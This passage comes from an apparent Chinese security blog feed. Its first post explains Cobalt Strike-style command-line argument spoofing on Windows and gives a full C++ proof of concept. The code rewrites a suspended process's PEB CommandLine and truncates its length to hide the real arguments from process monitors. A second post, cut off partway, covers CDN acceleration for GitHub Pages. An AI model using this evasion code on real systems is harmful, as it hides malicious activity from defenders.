title="PEB"></a>PEB</h2><p>首先看在 PEB 结构，我们主要关注 ProcessParameters</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _PEB <span class="token punctuation">{</span>  BYTE                          Reserved1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          BeingDebugged<span class="token punctuation">;</span>  BYTE                          Reserved2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPEB_LDR_DATA                 Ldr<span class="token punctuation">;</span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class="token punctuation">;</span>  PVOID                         Reserved4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         AtlThunkSListPtr<span class="token punctuation">;</span>  PVOID                         Reserved5<span class="token punctuation">;</span>  ULONG                         Reserved6<span class="token punctuation">;</span>  PVOID                         Reserved7<span class="token punctuation">;</span>  ULONG                         Reserved8<span class="token punctuation">;</span>  ULONG                         AtlThunkSListPtr32<span class="token punctuation">;</span>  PVOID                         Reserved9<span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          Reserved10<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class="token punctuation">;</span>  BYTE                          Reserved11<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  ULONG                         SessionId<span class="token punctuation">;</span><span class="token punctuation">}</span> PEB<span class="token punctuation">,</span> <span class="token operator">*</span>PPEB<span class="token punctuation">;</span></code></pre><p>PRTL_USER_PROCESS_PARAMETERS 结构体</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _RTL_USER_PROCESS_PARAMETERS <span class="token punctuation">{</span>  BYTE           Reserved1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID          Reserved2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  UNICODE_STRING ImagePathName<span class="token punctuation">;</span>  UNICODE_STRING CommandLine<span class="token punctuation">;</span><span class="token punctuation">}</span> RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> <span class="token operator">*</span>PRTL_USER_PROCESS_PARAMETERS<span class="token punctuation">;</span></code></pre><p>UNICODE_STRING 类型结构体</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>在上面通过创建并挂起进程后，接下来我们将通过<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank" rel="noopener">NtQueryInformationProcess</a>来获取 PEB 地址，这个函数未公开所以需要<a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019" target="_blank" rel="noopener">GetProcAddress</a>从 DLL 中检索出函数地址</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span> <span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token punctuation">(</span>  IN HANDLE<span class="token punctuation">,</span>  IN PROCESSINFOCLASS<span class="token punctuation">,</span>  OUT PVOID<span class="token punctuation">,</span>  IN ULONG<span class="token punctuation">,</span>  OUT PULONG<span class="token punctuation">)</span><span class="token punctuation">;</span>NtQueryInformationProcess ntip <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>DWORD retLen<span class="token punctuation">;</span><span class="token function">ntpi</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>    ProcessBasicInformation<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>retLen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过 PEB 标记的地址，使用<code>ReadProcessMemory</code>读取目标进程的 PEB 信息</p><pre class=" language-cpp"><code class="language-cpp">PEB pebLocal<span class="token punctuation">;</span>BOOL success<span class="token punctuation">;</span>success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>进一步获取ProcessParameters结构体信息</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来便是修改ProcessParameters中的CommandLine，其对应类型为UNICODE_STRING</p><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span>     <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>L<span class="token string">"cmd.exe /k dir\0"</span><span class="token punctuation">,</span>     <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="绕过PEB副本检测"><a href="#绕过PEB副本检测" class="headerlink" title="绕过PEB副本检测"></a>绕过PEB副本检测</h2><p>作者提到类似ProcessExplorer工具会检索PEB副本，导致隐藏参数失败，注意到_RTL_USER_PROCESS_PARAMETERS中的CommandLine参数为_UNICODE_STRING类型</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>当设置<code>Length &lt; sizeof(Buffer)</code>时，对于ProcessHacker和ProcessExplorer，都会终止显示Length字节后面的字符串，但同时并不影响进程的运行</p><table><thead><tr><th align="center">ProcessExplorer</th><th align="center">ProcessMonitor</th></tr></thead><tbody><tr><td align="center">长度限制</td><td align="center">命令隐藏</td></tr><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291301083.jpg" alt="-w501"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965291123554.jpg" alt="-w638"></td></tr></tbody></table><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_SHOW "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'"</span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_EXEC L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0"</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token punctuation">(</span>    IN HANDLE<span class="token punctuation">,</span>    IN PROCESSINFOCLASS<span class="token punctuation">,</span>    OUT PVOID<span class="token punctuation">,</span>    IN ULONG<span class="token punctuation">,</span>    OUT PULONG    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> canttrustthis<span class="token punctuation">)</span><span class="token punctuation">{</span>    STARTUPINFOA si<span class="token punctuation">;</span>    PROCESS_INFORMATION pi<span class="token punctuation">;</span>    CONTEXT context<span class="token punctuation">;</span>    BOOL success<span class="token punctuation">;</span>    PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>    DWORD retLen<span class="token punctuation">;</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    PEB pebLocal<span class="token punctuation">;</span>    RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Argument Spoofing Example by @_xpn_\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Start process suspended</span>    success <span class="token operator">=</span> <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>CMD_TO_SHOW<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        FALSE<span class="token punctuation">,</span>        CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call CreateProcess\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Retrieve information on PEB location in process</span>    NtQueryInformationProcess2 ntpi <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ntpi</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        ProcessBasicInformation<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>retLen    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read the PEB from the target process</span>    success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call ReadProcessMemory to grab PEB\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Grab the ProcessParameters from PEB</span>    parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">300</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set the actual arguments we are looking to use</span>    WCHAR spoofed<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> CMD_TO_EXEC<span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>spoofed<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>spoofed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline args\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////</span>    <span class="token comment" spellcheck="true">// Update the CommandLine length (Remember, UNICODE length here)</span>    DWORD newUnicodeLen <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pebLocal<span class="token punctuation">.</span>ProcessParameters <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> CommandLine<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>newUnicodeLen<span class="token punctuation">,</span>        <span class="token number">4</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline arg length\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Resume thread execution*/</span>    <span class="token function">ResumeThread</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>同这篇文章一起的还有<a href="https://blog.nviso.eu/2020/01/31/the-return-of-the-spoof-part-1-parent-process-id-spoofing/" target="_blank" rel="noopener">父进程ID欺骗</a>，这两个手段结合一起生成一个易用 exe 应该是很有效的红队手段，比如随机生成伪装命令、自动伪装，这样在来不及清理历史记录的情况下也能延缓蓝队的步伐…</p><p>但是奈何不会 c++，先留个坑</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/" target="_blank" rel="noopener">How to Argue like Cobalt Strike</a></li><li><a href="https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/" target="_blank" rel="noopener">The return of the spoof part 2: Command line spoofing</a></li><li><a href="youtube.com/watch?v=l8nkXCOYQC4">Red Teaming in the EDR age</a></li><li><a href="http://journal.seu.edu.cn/oa/pdfdow.aspx?Sid=201301005" target="_blank" rel="noopener">基于直接内核对象操作的进程伪装保护方法</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;突然好奇 argue 原理，于是有了此文&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>Github Page 加速</title>
    <link href="https://blog.sari3l.com/posts/afd91327/"/>
    <id>https://blog.sari3l.com/posts/afd91327/</id>
    <published>2020-08-01T16:54:48.000Z</published>
    <updated>2020-08-05T11:24:19.935Z</updated>
    
    <content type="html"><![CDATA[<p>今天实在被 github page 的加载速度恶心到了，测试了几个CDN效果，虽然有免费流量等活动，总感觉被收割了什么</p><p>中间测试了 netlify，开始对它速度不是很满意，但之后测试了几个还是回到了它，Orz</p><p>最终配合利用各种手段还算是达到了收费 CDN 的效果(有项目体量限制)🤣</p><p><strong>建议jsdelivr只做 JS、CSS 加速就好，毕竟好用的公共库用一个少一个</strong></p><ol><li>netlify - 资源托管、cdn 加速</li><li>cloudflare - cdn 加速</li><li>lazyload - 图片异步延迟加载</li><li>jsdelivr - 静态资源加速</li></ol><h2 id="1-Netlify"><a href="#1-Netlify" class="headerlink" title="1. Netlify"></a>1. Netlify</h2><ol><li><p>选择访问 github 仓库</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962888273340.jpg" alt="-w1241"></p></li><li><p>选择 github page 项目</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962967632283.jpg" alt="-w1246"></p></li><li><p>因为上传至github page为静态页面不需要编译，这里选择直接部署即可</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962968325497.jpg" alt="-w1238"></p></li><li><p>配置 netlify 域名解析</p><p> 这里正常情况 primary domain 应为绿色表示<code>正常状态</code>，但由于开启了 cloudflare cdn 导致 DNS 检测异常，检测能正常访问忽略此警告</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962974152636.jpg" alt="-w1222"></p></li><li><p>配置SSL/TLS证书</p><p> 由于我在 Netlify 前面使用 CloudFlare CDN，所以需要配合 CF 进行证书认证，非 CF 可以尝试右边的<code>Let&#39;s Encrypt</code>证书（这里我已经添加了证书，所以选择更新自定义内容证书）</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977185708.jpg" alt="-w957"></p><p> i. 先在 CF 创建<code>源证书</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962979813348.jpg" alt="-w1086"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962980996211.jpg" alt="-w825"></p><p> ii. 之后生成 PEM 格式密钥，记录源证书为 1，私钥为 2</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962981679521.jpg" alt="-w819"></p><p> iii. 访问<a href="https://support.cloudflare.com/hc/zh-cn/articles/115000479507" target="_blank" rel="noopener">此页面(管理 Cloudflare Origin CA 证书)</a>，记录根证书为 3</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962983204747.jpg" alt="-w894"></p><p> iv. 回到 Netlify，按上面对应序号填写证书内容后保存</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977767693.jpg" alt="-w638"></p></li></ol><h2 id="2-CloudFlare"><a href="#2-CloudFlare" class="headerlink" title="2. CloudFlare"></a>2. CloudFlare</h2><ol><li><p>配置 CNAME 指向 Netlify 自定义域名，并开启 CDN 加速</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962987471338.jpg" alt="-w1038"></p></li><li><p>选择加密模式为<code>完全</code>或<code>完全（严格）</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988163771.jpg" alt="-w1065"></p></li><li><p>开启<code>Always HTTPS</code>和 <code>HSTS</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988791773.jpg" alt="-w1047"></p></li></ol><h2 id="3-lazy-load"><a href="#3-lazy-load" class="headerlink" title="3. lazy load"></a>3. lazy load</h2><p>项目地址：<a href="https://github.com/Troy-Yang/hexo-lazyload-image" target="_blank" rel="noopener">https://github.com/Troy-Yang/hexo-lazyload-image</a></p><p>按文档安装、配置即可</p><pre class=" language-shell"><code class="language-shell">$ npm install hexo-lazyload-image --save</code></pre><h2 id="4-jsdelivr"><a href="#4-jsdelivr" class="headerlink" title="4. 